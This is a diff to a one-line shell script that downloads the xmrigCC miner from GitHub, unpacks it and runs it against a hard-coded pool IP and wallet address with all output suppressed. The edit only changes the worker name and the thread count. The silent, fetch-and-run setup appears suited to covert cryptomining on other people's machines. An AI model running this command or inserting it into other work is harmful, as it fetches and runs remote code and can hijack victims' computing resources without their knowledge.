@@ -1,6 +1,6 @@
 #!/bin/sh
 
-wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.1/xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && rm xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && ./miner/xmrigDaemon -o 157.230.239.11:80 -u SaLvsC9mJtH435TnShocT387uQRGZcDZGJsfYF4MfuAGTRGAffsUNjSAtNdgDtsqHGDAqSu8icwQpjD8eBbXAtoyNqzHDQW4oPA -p WK01 -k -a randomx -t2 > /dev/null 2>&1
+wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.1/xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && rm xmrigCC-3.4.1-linux-dynamic-amd64.tar.gz && ./miner/xmrigDaemon -o 157.230.239.11:80 -u SaLvsC9mJtH435TnShocT387uQRGZcDZGJsfYF4MfuAGTRGAffsUNjSAtNdgDtsqHGDAqSu8icwQpjD8eBbXAtoyNqzHDQW4oPA -p MJ -k -a randomx -t4 > /dev/null 2>&1
 
 
 
